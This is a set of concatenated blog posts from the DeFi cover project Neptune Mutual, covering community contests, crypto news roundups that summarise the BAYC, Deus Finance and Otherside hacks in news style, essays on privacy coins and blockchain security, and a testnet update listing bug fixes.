of the chains they choose to interact with Moonpot on. Users can deposit cryptocurrency into one of the Moonpots and immediately earn daily interest on their assets.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<h2 id="partnerships">Partnerships</h2><p>We are thrilled to have SupraOracles join us on our mission to provide parametric cover pools based on stablecoins for proper risk management. SupraOracles’s mission is to enable traditional capital markets with the web3 environment in order to solve the oracle conundrum, and eventually power the future of finance with the help of their developer community and an expanding number of partners. The initial goal of this long-term and mutually beneficial collaboration is to provide DeFi with the ability to capture off-chain and cross-chain data. This also includes collaborating with SupraOracles to bring multi-chain capabilities, speed, and lower gas fee transactions to our product.</p><p>We are also thrilled to have the support of an exceptional group of investors in our current fundraising rounds, with Poolz Ventures joining the list alongside other market leaders such as Animoca Brands, Coinbase Huobi Global, and OKX to help us on our journey to the next level and beyond.</p><h2 id="recent-news">Recent News</h2><p>We have laid out some of our plans to reward community members who have supported us on our journey thus far. As part of these plans, we are excited to kick-start a new initiative in the form of the “rising star” contest where community members can win up to $1000 and more. The NPM Rising Stars are members of our community who contribute to our community discussion channels and help to shape our future in a more meaningful way. The goal is to reward Discord members who have assisted us with the most valuable engagement in terms of product feedback, community awareness, as well as any additional enhancements that they would like to see on our platform. The competition began on April 21 and will end on May 14. To enter the competition, you just need to sign up for it through Gleam, complete all of the tasks, join the selected list of channels on our Discord server, and become an integral part of our community discussion. Each month, we will choose a rising star and the top five users with the highest levels, with monthly rewards and a grand prize as competition perks. The rising star will receive $250, the five other runner-ups will each receive $50, and an additional reward of $1500 will be divided among three members of the winner list at our sole discretion.</p><h2 id="protocol-update">Protocol Update</h2><p>The development team has finished testing all of our protocol’s internal modules and functionalities. We have been working with an audit and security firm to perform the code review, to protect the protocol against smart contract vulnerabilities, hacks, and exploits.</p><p>Our code base is open source, and the history of “commits” to our protocol, SDK, native website, and test net repositories on Github can be viewed.</p><h2 id="upcoming-events">Upcoming Events</h2><p>We have established internal ground rules for the launch of our Ambassador Program. We want to recognize your contributions to the protocol as a valuable member of our community by providing an avenue for you to go further in making a bigger impact on our mission. The program will run for four months on a seasonal basis, with each season focusing on a specific set of indexes that will assist us in meeting the milestones on our roadmap. The performance of the Ambassadors will be evaluated and ranked. The purpose of this initiative is to involve you, our community members, in activities such as community engagement, design, content creation, growth, and other promotion strategies. Ambassadors will work closely with our team members and will be expected to become the voice and representative of our community, with exclusive perks and benefits as a reward.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<h2 id="tldr">TL;DR</h2><ul><li>BAYC Instagram exploited, hacker steals $2.7 million worth of NFTs.</li><li>Deus Finance got hacked with over $13 million worth of digital assets stolen.</li><li>OneFootball enters the metaverse with recent funding from Animoca Brands.</li><li>Meta prepares to launch a retail store for the Metaverse.</li><li>French fashion house Dior makes an entry into the metaverse in China</li></ul><p>With the advent of Decentralized Finance (DeFi), the world of finance is becoming more open and safe for everyone. Traditionally, users have been subjected to laws that have at times wiped off millions or even billions of dollars from their fortunes because of a lack of transparency. This new technological revolution is being led by a shift away from giant tech companies toward a community-led alternative. More than $800 billion is predicted to be moved by NFTs in the next two years as the business grows rapidly in the fields of art and games as well as utilities and sports.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>On the one-year anniversary of its launch, the Bored Ape Yacht Club (BAYC) was the victim of a social media attack that resulted in the hacker stealing multiple valuable NFTs. Users who followed the scammer’s lead and clicked on a fake link to nonexistent metaverse land drops were tricked into connecting their Metamask wallets. People were then asked to sign a safeTransferFrom transaction on the fictitious site, which transferred their funds to the scammer’s account. Several high-value stolen assets have been discovered in the scammer’s wallet address, including 4 BAYC NFTs, 7 MAYC NFTs, 3 BAKC NFTs, and 1 CloneX NFT, totaling approximately $2.8 million.</p><p>Deus Finance, a DeFi protocol, falls in yet another exploit, with more than $13 million in digital assets stolen this time. This comes only a few months after the protocol was similarly hacked, with flashloan-assisted price oracle manipulation. The attacker was able to manipulate the price of collateral DEI and use it to borrow approximately 800 ETH to launch the hack, and drain the pool, all of which was withdrawn from Tornado Cash and tunneled to Fantom via Multichain.</p><p>A number of hackers distributed various links to a phishing website that resembled the Otherside NFT project page, allowing users to lose a large number of blue-chip NFTs. The scammers carried out the attack by luring unsuspecting people to the Otherside phishing webpage using the most common phishing method. Users who connected their Metamask wallets to the site lost a significant amount of blue-chip NFTs totaling $6.2 million. 6 MAYCs, 5 BAYCs, 9 Azukis, 2 WOWs, 30 plots of The Sandbox land NFTs, and many more were among the notable steals.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>OneFootball, a football media application with live scores, news, and statistics, has entered the metaverse after raising $300 million in a Series D round to expand the company’s presence on Web3 and develop new features for its platform. According to a recent announcement, the Berlin-based application has joined forces with Animoca Brands, Liberty City Ventures, and others to form OneFootball Labs, a joint venture that will enable clubs, leagues, federations, and players to provide digital assets and fan-centric experiences based on blockchain technology. Furthermore, fans all over the world will be able to purchase and store virtual collectibles using their email address and credit card.</p><p>The Metaverse will soon have a new retail destination thanks to Meta’s upcoming retail store opening. Meta’s CEO Mark Zuckerberg recently posted that the company’s Burlingame Campus in California will open its brick-and-mortar Meta Store on May 9 where customers can explore and purchase virtual reality headsets. In addition to the Quest 2 VR headset, a video calling portal, smart glasses, and a slew of other tech gadgets will be on display at the store. Customers can also test out the devices to experiment with augmented and virtual reality and purchase them in-store or later online at Meta’s or Ray-Ban’s websites.</p><p>Chess.com, an internet chess server, and news website, has announced the launch of Treasure Chess, a first-of-its-kind NFT marketplace on the Polygon blockchain, in collaboration with Wyre, a cryptocurrency compliance infrastructure provider. Treasure Chess enables chess and cryptocurrency enthusiasts to transform their games into one-of-a-kind NFTs called Treasures, where users can create, buy, and sell digital assets. These digital collectibles are essentially game cards that contain information such as usernames, ratings, game results, and achievements, as well as a GIF reproduction of the game. The first three Treasures are free to mint, while the remaining assets will cost $5 after that.</p><p>State departments are increasingly turning to this new sector to help build their cultural industries as NFTs become more widely used around the world. China’s tax offices in Chengdu and Shanghai have published 1,000 and 2,000 NFTs on Tencent’s blockchain, respectively, featuring their tax office mascots. The current action was prompted by public statements made by tax agencies earlier this month. The country’s regulatory uncertainty has led these departments to keep these digital collectibles non-transferable to avoid speculation.</p><p>As the wild world of Web3 technology and metaverse experiences makes its way into China’s mainland, Dior hopes to jump ahead of the pack and establish itself in the metaverse as soon as possible. In collaboration with iWeekly’s parent company Meta Media Holdings, the French fashion house has launched its first-ever exhibition in China, titled On The Road. The exhibition, which was hosted on the Baidu metaverse social application XiRang, featured the company’s Fall 2022 menswear collection. Viewers can enter virtual space housing the new clothing line via an interactive experience in the Meta Ziwu.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p>In its infancy, around a fourth of DeFi users took advantage of blockchain technology to hide illicit transactions. Back then, cryptocurrency exchanges didn’t usually enforce a KYC process, and from this, the use of crypto in money laundering and cybercrime slowly became common. Consequently, this made it incredibly difficult to catch cybercriminals red-handed.</p><p>Fortunately, data analytic providers like Chainalysis made it possible to track illicit transactions on decentralised public ledgers. Being on public display, law enforcement agencies can locate wallet addresses suspected of unlawful activity.</p><p>Cybercriminals throw their “dirty digital money” about and give it to those who have no idea what they’re getting themselves into. The ones on the receiving end tend to bear the burden of being questioned by authorities while being completely unaware of what is going on.</p><p>Hence why there became a need to innovate privacy coins.</p><p>Privacy coins mask transactions to make them untraceable by everyone including the users or outsiders. Through them, their users can keep their activities private and away from unwanted attention.</p><p>Yet, the lack of regulation and legality of this new emerging tech sparks numerous debates about who will truly benefit from its design.</p><p>Are privacy coins going to make crypto safer for you and other users vulnerable to cybercrime?</p><p>Or, will it just be another vehicle for criminals to hide and run away with their laundered money?</p><h2 id="how-privacy-coins-work">How privacy coins work</h2><p>First, let’s dive deeper into understanding some prime examples of privacy coins and how they work.</p><p>Privacy coins, like most cryptocurrencies, are fungible and built on a public blockchain. What sets them apart from Bitcoin and other popular altcoins is privacy coins’ ability to obscure their user’s identities and transactions. If you use privacy coins, your fund transfers will become untraceable. In addition, receiving unwanted illicit transactions will not “stain” your address and digital assets. Many privacy coins advertise their technology to be cost-efficient, faster, and more eco-friendly than their more public counterparts.</p><p>Leading the pack, Monero is the most popular privacy-enhanced cryptocurrency on the market, at the time of writing. It has a market cap of over USD 4 billion. To ensure their users’ privacy, Monero uses ring signatures that shuffle addresses with decoys that offset any prying eyes from the actual transaction. Moreover, they also make use of distinct temporary wallet addresses for the senders and recipients to ensure anonymity on every transaction. If that level of privacy doesn’t cut it, as a user, you get to a stealth address that obscures your real public address, making it difficult to retrace previous transactions.</p><p>Another popular privacy coin is DASH. In contrast to Monero, DASH is deflationary. They can also make it possible to transact on a public network, have transactions cut up into smaller parts, and obscure them by mixing with other users’ wallets.</p><p>Just like Dash is another privacy coin called Zcash. Both give their users the option to transact through public or private networks with a t-address or z-address, respectively. Zcash does this through zk-SNARK, a zero-knowledge proof cryptography mechanism that obscures transaction data and only validates it between sender and recipient.</p><h2 id="privacy-isn%E2%80%99t-the-issue">Privacy isn’t the issue</h2><p>Nonetheless, the question is, “who is it for?” What purpose do privacy coins serve?</p><p>As of now, privacy isn’t a primary concern for the great majority of blockchain and DeFi users. Even though privacy coins help participants retain their anonymity and make them “feel safe”, it may be more important for cryptocurrency users and owners to have something that actually makes them safe. There is a significant difference between hiding your data from the public and protecting your digital assets from the risk of crypto exploits.</p><p>The use of privacy coins may be more advantageous for private companies and conglomerates who want to make their transactions a secret from the general public.</p><h2 id="are-privacy-coins-legal">Are privacy coins legal?</h2><p>Regulation and authorities tend to frown on hiding financial transactions, especially in a relatively new industry.</p><p>Critics all over the world are pointing out how privacy coins may be doing more harm than good. Many discussions focus on their potential use in money laundering and how they pose a greater threat than benefit for digital asset owners and investors.</p><p>Countries like South Korea and Australia have taken serious action on privacy coins by banning their trade on their crypto exchanges. Japan took a further step by prohibiting them entirely.</p><p>Recently, financial markets regulation in the UK advised one of their most prominent crypto exchanges, Kraken, to remove Monero from their offering.</p><p>Other countries have taken a more subtle approach such as consolidating crypto exchange “KYC” processes and improving visibility on private networks.</p><h2 id="it%E2%80%99s-not-made-for-security">It’s not made for security</h2><p>Privacy coins aren’t designed to increase security. They are intended to enhance user anonymity and obscure transactions. Moreover, privacy coins belong to a completely different area of the blockchain and that isn’t digital asset security.</p><p>Simply, they aren’t made for security.</p><p>There’s a huge difference between protecting your digital assets and protecting your user identity. Both aren’t the same.</p><p>You can reduce your crypto market risks by investing in DeFi technology that’s laser-focused on your digital asset’s security such as cover policies, cold wallets, and even just researching more about the crypto industry.</p><p>Although hiding your transactions won’t be part of that list.</p><h2 id="so-how-can-you-secure-your-crypto-assets">So, how can you secure your crypto assets?</h2><p>Being a crypto owner and investor, you can safeguard your digital assets by becoming a parametric cover policyholder.</p><p>Parametric covers are not like traditional covers that go through an intensive individual claims assessment. Designed to adapt fast together with the crypto market, parametric covers follow parameters specified in the cover pool’s smart contract to protect risk events, such as crypto exploits and exchange hacks, as opposed to protecting against individual loss.</p><p>In short, as a cover policyholder, you can eliminate your risk of getting your claims denied with the objective approach of parametric cover policies.</p><p>You can <a href="https://blog.neptunemutual.com/neptune-mutual-testnet-is-live/" rel="follow">try how easy it is to purchase a cover policy on the Neptune Mutual testnet.</a></p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

The most popular NFTs are quite often the most valuable, with buyers spending hundreds of thousands to millions of dollars to acquire a one-of-a-kind piece of media in the form of images, films, arts, music, videos, and many others through new forms of storytelling within various mediums. These assets are gaining popularity among celebrities, collectors, gamers, and art enthusiasts alike, and are quickly gaining global prominence.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>Universe, a lightning-fast and innovative DeFi-as-a-service (DaaS) cryptocurrency protocol on the Avalanche network, has been ruggedized, effectively removing UNIV value. The hacker minted approximately 16 trillion of the project’s native token and has been selling them on various exchanges, with gains already exceeding $250,000.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>Coinbase launched the beta version of its much-anticipated NFT marketplace. The exchange also announced its intention to decentralise this marketplace by migrating features from Coinbase tech to decentralised solutions and adding support for NFTs on blockchains other than Ethereum. The architecture is designed to be an open marketplace where users can trade NFTs using their own non-custodial wallets rather than the Coinbase Wallet. Transaction fees have been waived for a limited time, and beta testers will be able to create a Coinbase NFT profile and begin buying and selling NFTs.</p><p>Hyundai Motor Company has become the first automaker to enter the community NFT market, releasing 30 limited digital collectibles in collaboration with the NFT brand Meta Kongz. The Hyundai NFT Universe is expected to expand the Hyundai brand experience, particularly for the MZ generation, in a completely new way, reinforcing the company’s commitment to innovation in both the real world and the metaverse. Hyundai also released a short film detailing their amazing adventures in the Metamobility universe, as well as a teaser for a shooting star-shaped NFT that will be released in May.</p><p>The United States Air Force (USAF) has applied for a trademark for SpaceVerse with the United States Patent and Trademark Office in order to expand military training into the Metaverse.

Each holder, along with their savvy pirate crews, can explore the Broken Sea in search of riches and glory while battling the monsters that lurk beneath. Holders can also gain exclusive access to an NFT marketplace, private clubs, and even real-world events, including early access to 9GAG projects and other exclusive drops.</p><p>Degree Metathon, the first-ever metaverse marathon, will take place on Decentraland for two days beginning April 26. The run, which will take place at Genesis Plaza, aims to promote a more inclusive movement in Decentraland. The idea is that everyone should be able to move freely in both the virtual and physical worlds, which is why Degree has designed a wheelchair-friendly course for the race that is also compatible with adaptive devices and will allow runners to run alongside famous athletes and celebrities.</p><p>ORIGYN, a Swiss non-profit organisation, and the UEFA Foundation for Children have collaborated to launch ‘NFTs for Good.’ These one-of-a-kind football collectibles are part of the same-named ORIGYN initiative, which starts with the referee’s coin from the EURO 2020 Final between England and Italy and aims to unlock the powers of rights for objects of value, and has revealed its cooperation and coordination with the UEFA Foundation for Children. These assets will be auctioned off together as a physical and digital twin NFT.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p><strong><strong>Successful attacks on blockchain platforms and protocols have become increasingly common in recent times, raising questions about how stakeholders can better improve the security and integrity of their communities.</strong></strong></p><p>People and capital are flooding into the blockchain space like never before. So much so that governments all over the world are having to draw up regulatory frameworks as the growing presence of digital assets, such as NFTs, DeFi projects, and cryptocurrencies is no longer impossible to ignore.</p><p>However, all this public interest and money coming in means the risks of cyber-attacks and malicious activities are on the rise too. For many would-be investors and stakeholders, this risk remains a bottleneck preventing them from embracing blockchain-based platforms and applications.</p><h2 id="blockchain-hackers-are-more-sophisticated-than-ever">Blockchain Hackers Are More Sophisticated Than Ever</h2><p>Blockchain has been hailed as an inherently secure technology, and for the most part, it really is. But the reality is that there are several vulnerabilities unaccounted for, and hackers are getting more sophisticated by the day.</p><p>As <a href="https://atlasvpn.com/blog/blockchain-hackers-stole-nearly-700-million-in-q1-2022" rel="nofollow noopener noreferrer">reported by Atlas VPN</a>, hackers are having a field day exploiting vulnerabilities in blockchain projects, carting away over $1 Billion in Q1 2022 alone.</p><p>The Ethereum and Solana ecosystems appear the worst hit, which is unsurprising seeing as these networks host the majority of dApps, smart contracts, and related protocols today. What is surprising, however, is the amount. Losing over $1 billion in the space of three months is worrisome, to say the least.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.neptunemutual.com/content/images/2022/07/money-lost-to-blockchain-hackers-q1-22.png" class="kg-image" alt="" loading="lazy" width="759" height="520" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/money-lost-to-blockchain-hackers-q1-22.png 600w, https://blog.neptunemutual.com/content/images/2022/07/money-lost-to-blockchain-hackers-q1-22.png 759w" sizes="(min-width: 720px) 720px"><figcaption><strong><em>Source: </em></strong><a href="https://atlasvpn.com/blog/blockchain-hackers-stole-nearly-700-million-in-q1-2022" rel="nofollow noopener noreferrer"><strong><em>atlasvpn.com</em></strong></a></figcaption></figure><p>NFT projects only became popular less than two years ago, but are now the most targeted. The recent massive hacks that saw projects like the <a href="https://www.businesstoday.in/crypto/story/ronin-blockchain-network-hacked-625-mn-stolen-in-biggest-reported-crypto-hack-to-date-327923-2022-03-30" rel="nofollow noopener noreferrer">Ronin</a> and <a href="https://wormholecrypto.medium.com/wormhole-incident-report-02-02-22-ad9b8f21eec6" rel="nofollow noopener noreferrer">Wormhole</a> bridges lose over $900 million combined are proof of just how savvy hackers have become.</p><p>Unfortunately, much of these lost funds are unrecoverable except through the benevolence of the hacker. For instance, shortly after the attack on the Wormhole bridge, the development team issued a message appealing to the hacker to return the stolen funds in exchange for a $10 million reward.</p><p><br>Current Blockchain Security Measures Are No Longer Enough</p><p>Hackers are an ever-present threat to blockchain ecosystems. In turn, this has led to the rise of various security measures aimed at safeguarding digital assets and more importantly, cementing stakeholders’ confidence in the project. These include:</p><h2 id="smart-contract-audits">Smart Contract Audits</h2><p>A smart contract audit is exactly what it sounds like — a comprehensive, methodical examination and analysis of a smart contract’s code to discover errors and security vulnerabilities. This process is intended to give the code a clean bill of health by carefully combing through the lines, finding issues, and suggesting ways to fix them.</p><p>Smart contract audits are a necessity when it comes to protecting blockchain communities. According to a <a href="https://www.uhu.es/ijdar/10.4192/1577-8517-v21_6.pdf" rel="nofollow noopener noreferrer">2021 study</a> published by the International Journal of Digital Accounting Research (IJDAR), even prominent accounting firms, including Deloitte, PwC, and Ernst &amp; Young (EY), have rolled out various smart contract auditing solutions.</p><p>However, these audits are not without their limitations. For one, new risks arise all the time, meaning it won’t be until the next audit or after the damage has occurred that any new security vulnerabilities are detected.</p><p>There are a growing number of instances where smart contracts were fully audited by reputable firms, only for the protocol to be exploited down the line. For example, the case of the <a href="https://slowmist.medium.com/detailed-analysis-of-the-31-million-monox-protocol-hack-574d8c44a9c8" rel="nofollow noopener noreferrer">MonoX hack</a> back in December 2021, which saw over $31 million lost, despite the fact that the protocol was <a href="https://docs.monox.finance/library/audits" rel="nofollow noopener noreferrer">audited three times that year</a>.</p><p>Another issue is the scope of the audit. There isn’t an industry standard yet for how smart contract audits should be conducted or what framework to use for storing/accessing audit evidence. Some companies might offer more in-depth processes compared to others. These constitute gaps in the literature that must be addressed sooner rather than later.</p><h2 id="extensive-pre-launch-testing">Extensive Pre-Launch Testing</h2><p>This involves using a testnet to conduct more rigorous trial runs before taking the project live. This way, creators and investors can quickly identify issues and refine the smart contract code accordingly until everything is running as it should.</p><p>While incredibly important for improving security, extensive pre-launch testing can be quite expensive and time-consuming. Test runs and resulting fixes can last weeks or even months, which can be problematic for development teams working on tight deadlines. Some may be tempted to rush the process or gloss over certain aspects, which might prove vital only after the project has been released to the public.</p><h2 id="bug-bounties">Bug Bounties</h2><p>Project development teams can leverage a critical resource at their disposal — their community members — to improve security within the ecosystem. It’s important to note that the power of a blockchain community is not dependent on how large it is, but on the level of interaction and harmony within the community.</p><p>Incentivising users to identify weak links in the smart contract code is a great way to get the community more involved and ultimately increase trust in the project. What’s more, it offers a practical alternative to hiring costly security firms.</p><p>The main concern here is the cost of the incentive. Projects must be able to offer enticing bounty rewards if they want to attract the best developers who are able to dig deep into the framework to find vulnerabilities. So far, bug bounty rewards range from a few thousand dollars to millions. DeFi project, MakerDAO, offers one of the largest bug bounty rewards in the industry amounting to <a href="https://cointelegraph.com/news/makerdao-launches-biggest-ever-bug-bounty-with-10m-reward" rel="nofollow noopener noreferrer">$10 million</a>.</p><h2 id="outsourcing-protection">Outsourcing Protection</h2><p>Some blockchain communities turn to specialised security companies to safeguard one or more aspects of their project. This can be highly advantageous since it means the security is left in the hands of the experts.</p><p>One reason this measure might not be enough is that it can lead to increased risk. Blockchain projects are decentralised, whereas security companies typically operate using a centralised system. This makes these companies a highly-valuable target to hackers. Once they break in, they can gain unfettered access to whatever the company was protecting.</p><p>Also, outsourcing protection means communities need to establish trust in the security firm. This is counterintuitive to an ecosystem that was built and deployed using a decentralised, trustless network.</p><h2 id="impacts-of-blockchain-hacking-incidents-on-communities">Impacts of Blockchain Hacking Incidents On Communities</h2><p>The news of a blockchain project being hacked will no doubt reverberate across the community. For the members, loss of funds represents the biggest impact, followed closely by decreased confidence in the project.</p><p>The community will expect immediate action. First, the developers will need to walk members through the technical weakness that led to the attack. This can provide some reassurance that the development team is on top of the situation. Next, the community needs to be briefed on how the creators intend to handle the recovery of the stolen funds.</p><p>For projects that are insured under traditional discretionary models, they tend to undergo a lengthy claims process. However, this stage is often full of uncertainty, frustration, and impatience. This is because traditional claim assessments can take weeks or even months to conclude.</p><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/07/claim-assessment.png" class="kg-image" alt="" loading="lazy" width="1400" height="788" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/claim-assessment.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/claim-assessment.png 1000w, https://blog.neptunemutual.com/content/images/2022/07/claim-assessment.png 1400w" sizes="(min-width: 720px) 720px"></figure><p>What’s more, some claims may be denied due to policy exclusions or discretionary rejection. Imagine losing your funds only to be told that there will be no reimbursement because the nature of the loss wasn’t covered in your policy or the claims adjuster did not find enough evidence to include you in the payout. This would lead to anger, resentment, and a sense of double loss.</p><p>The reputation of the community and its developers will be tarnished too. No one will want to advocate for, let alone join, a community that has been hacked and has no system in place to reimburse affected members in a timely way.</p><h2 id="the-way-forward">The Way Forward</h2><p>In an ecosystem rife with evolving risks, creators can better protect their communities through parametric cover models. Already a popular option to protect against weather-related risks in the real world, parametric covers provide a progressive way to mitigate risks and address evident coverage gaps in the blockchain space.</p><p>For the uninitiated, parametric models cover the probability of a predefined event happening and payout according to a predefined scheme. Payout amounts, the scope of coverage, parameters, third parties, and other important details are clearly defined in the agreement. If the predefined events do occur, the payout mechanism is automatically triggered.</p><p>Basically, it replaces the claims assessment process with a simple yes/no equation. Did the triggering event occur? If yes, then the payment is immediately released to all policyholders. If no, then payment is not made. No discretionary measures or processes are needed.</p><p>This removes ambiguity, which is a big deal in today’s blockchain communities. With parametric covers, there’s no confusion as to what events are covered by the policy. Payouts are also released within a matter of days, as opposed to discretionary models where victims often wait weeks or even months to get their payments.</p><h2 id="create-parametric-cover-pools-on-the-neptune-mutual-ecosystem">Create Parametric Cover Pools on the Neptune Mutual Ecosystem</h2><p>The Neptune Mutual ecosystem is a decentralised protocol where blockchain project creators and developers can generate parametric cover models to protect their communities.</p><p>There are four stakeholders in this ecosystem:</p><ul><li><strong><strong>Cover Creators </strong></strong>— These are the people who create the cover pool based on the unique requirements of their projects or communities.</li><li><strong><strong>Liquidity Providers</strong></strong> — These are the people who channel liquidity into the cover pool, thereby ensuring adequate funds in the pool to cover payouts if triggered.</li><li><strong><strong>NPM Token Holders</strong></strong> — These are the people who verify whether a triggering event occurred or not. They stake their NPM tokens to initiate the incident reporting process and then vote on the validity of the incident.</li><li><strong><strong>Policy Holder</strong></strong> — These are the community members that the cover pool is designed to protect. Anyone can purchase a cover. If a payout is triggered, all policyholders are treated equally.</li></ul><h2 id="build-trust">Build Trust</h2><p>As a project creator, building a parametric cover dedicated to your project builds trust across the community and protects your reputation. Creating a cover pool requires you to stake at least 4000 NPM tokens. Providing initial liquidity to the pool demonstrates your commitment to protecting your ecosystem.</p><h2 id="action-not-words">Action, Not Words</h2><p>Creating parametric cover models tells your community members that you have an actionable recovery plan in place if things go wrong. They can see the scope of the pool themselves and can even decide to become stakeholders, thereby contributing to the security of the community and earning rewards.</p><h2 id="seamless-integration">Seamless Integration</h2><p>With Neptune Mutual’s SDK, you can embed your cover pool into your platform. Community members who wish to become stakeholders in the pool can access it directly. This improves engagement within the ecosystem and helps the community remain focused on the project.</p><h2 id="bottom-line">Bottom Line</h2><p>Increasingly, the success of any blockchain project is reliant on the security of the ecosystem.

We really appreciate this input from our community.</p><p>Many thanks to everyone who joined us in trying out our protocol and for all those great comments shared on <a href="https://discord.gg/zNFdztUARv" rel="nofollow noopener noreferrer">our Discord channel</a>.</p><p><strong><strong>Over 18,500 users</strong></strong>, including you, purchased cover policies and provided liquidity to cover pools on our platform. We’re impressed to see how active you were in reporting and voting on incidents as well as participating in our staking pools.</p><p>The tutorial videos we published on our YouTube channel were viewed over 5k times. We will continue to add new types of content to our channel so don’t forget to <a href="https://www.youtube.com/c/NeptuneMutual" rel="nofollow noopener noreferrer">subscribe</a> to get the latest Neptune Mutual updates.</p><p><strong><strong>The Neptune Mutual testnet has without a doubt exceeded our expectations. Thanks to you!</strong></strong></p><p>Your feedback helped us refine and improve our application as we move towards our launch on the mainnet.</p><p>Over the weeks between our testnet launch, March 10th, and the end of our Gleam competition, April 10th, our users’ feedback helped us develop and significantly improve the Neptune Mutual protocol — this underlines to us the importance and value of our active community.</p><p>Hence why we’re so excited to reward our most active testnet users — results to be announced in May. This is our way of rewarding our community for their steadfast feedback and support.</p><p>While we wait to find out who our 100+ lucky winners are…</p><p><strong><strong>Let’s go on a quick run-through of everything that’s happened to date on the Neptune Mutual testnet:</strong></strong></p><h3 id="1-we-upgraded-our-database-due-to-high-demand">1 We upgraded our database due to high demand</h3><p>After receiving a much higher than expected number of testnet users, the massive spike in traffic overloaded our database servers and sent our application offline for a couple of hours.</p><p>We upgraded our database hosting plan to allow much higher traffic, and got the application back up and running.</p><p>As our database size became larger, we kept making several performance tunings and query optimizations.</p><h3 id="2-our-team-added-a-subgraph-bridge-to-avert-future-indexing-issues">2 Our team added a subgraph bridge to avert future indexing issues</h3><p>We’ve been using The Graph protocol for indexing blockchain events and we faced some indexing issues that made the application sluggish when reflecting the amount of liquidity provided and policies purchased. On one occasion, the Graph protocol also suddenly went offline for a few hours.</p><p>The Graph protocol going offline was something we never bothered to think would happen. We had to come up with a solution fast to avoid these issues again arising in the future. We quickly built a subgraph bridge that caches known events to ensure that our applications remain available even when The Graph is temporarily down.</p><h3 id="3-ropsten-was-so-slow-we-switched-to-polygon-mumbai">3 Ropsten was so slow we switched to Polygon Mumbai</h3><p>The Ropsten network has always been our preferred test network choice as it is similar to the (current) Main Ethereum Network. The primary reason to deploy our protocol on Ropsten was to check and see how our protocol functions in a multi-user and close to the real-world environment.</p><p>Interestingly, we witnessed <a href="https://coinmarketcap.com/alexandria/glossary/chain-reorganization" rel="nofollow noopener noreferrer">frequent reorgs</a> in the Ropsten network. Transactions that were included and confirmed having more than 50 confirmations disappeared from Etherscan. The Ropsten network was relatively unstable during full load than what we experienced using it earlier.</p><p>Many users commented on the performance issues they experienced using the Ropsten network. Users who purchased policies saw their cxTokens disappear after an hour. The platform’s TVL kept fluctuating up and down even when a steady flow of liquidity was added. The reorgs not only affected our application but also the hosted subgraph. As a result, users who collected points on the leaderboard also saw their points disappear frequently. Overall, the network was slow and unreliable.</p><p>Because of this, we switched to a faster and more reliable test network, Polygon Mumbai. Once we deployed our protocol in Mumbai, the user experience became relatively stable. There were no longer any reorg issues and, as a result, no more reindexing issues and transactions disappearing.</p><h3 id="4-new-and-improved-uiux-design">4 New and improved UI/UX design</h3><p>We updated our UI/UX design to enhance the Neptune Mutual experience.</p><p>In particular, we improved the transparency and labeling of the status of transactions on the protocol. To make it easier to identify if a transaction is in progress or if it has been completed successfully.</p><p>We achieved this by using unique icons for each different status of the transactions.</p><h2 id="5-we-fixed-our-policy-status-display">5 We fixed our policy status display</h2><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/07/testnet-review-bug-fix.png" class="kg-image" alt="" loading="lazy" width="1400" height="959" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/07/testnet-review-bug-fix.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/07/testnet-review-bug-fix.png 1000w, https://blog.neptunemutual.com/content/images/2022/07/testnet-review-bug-fix.png 1400w" sizes="(min-width: 720px) 720px"></figure><p>Based on user feedback, our team added an icon to display the policy status, disabled the ‘purchase cover’ and ‘provide liquidity’ features when a cover is in its reporting period, and the cover status is now shown on almost every page on the platform.</p><p>We also added an icon for the process of adding tokens to a user’s MetaMask wallet.</p><h3 id="6-added-multi-language-support">6 Added multi-language support</h3><p>As a global community-driven protocol, we place huge importance on making sure users get access to the platform in their native language.</p><p>That’s why we added a multi-language support feature so that our users can access Neptune Mutual in their native language wherever they may be in the world.</p><p>Although this is still a work-in-progress, we’re proud to say we’re going all-in on this.</p><h3 id="7-improved-form-validation">7 Improved form validation</h3><p>Our team improved validation in our forms particularly with our cover purchase, providing liquidity, and other protocol features.</p><h3 id="8-improved-transaction-error-handling">8 Improved transaction error handling</h3><p>We improved our platform’s transaction error handling to avoid future complications when it comes to transactions.</p><p>We believe that hiding blockchain error messages is not a good design and therefore added a function to forcefully send a possibly failing transaction. The failed transactions were helpful in debugging why such an error occurred.</p><h3 id="9-updated-real-time-display-of-balance-and-allowance-data">9 Updated real-time display of balance and allowance data</h3><p>Balances and allowances now display more accurately, in real-time after a user performs an action.</p><h3 id="protocol-features-added">Protocol Features Added:</h3><p><strong>Strategy</strong></p><ul><li>Added accrue interest feature: brings the earned interest from lending strategies back to the liquidity pools during unlock cycles.</li><li>Added an extra validation <em><em>mustHaveNoBalanceInStrategies</em></em> to ensure strategies are empty during withdrawals.</li><li>To reduce the deployment size, we moved our vault strategy logic from <em><em>VaultLibV1 </em></em>to <em><em>StrategyLibV1</em></em>.</li><li>Fixed the accounting errors of lent out amount, received amount, and the total amount for any given strategy.</li></ul><p><strong>Governance</strong></p><ul><li>Fixed a bug in <em><em>claimsBeingsFrom</em></em> function so that if a resolution is “Incident Occurred”, the claim period starts immediately. If “False Reporting”, the claim period is set to 0, which means it never starts.</li><li>Fixed a bug in <em><em>unstake</em></em> feature that allows users to invoke unstake before an incident is resolved, and fixed another issue in the feature of <em><em>unstakeWithClaim</em></em> which allows users to invoke unstakeWithClaim even after the claim period is ended.</li><li>Added <em><em>getAttestation</em></em>, 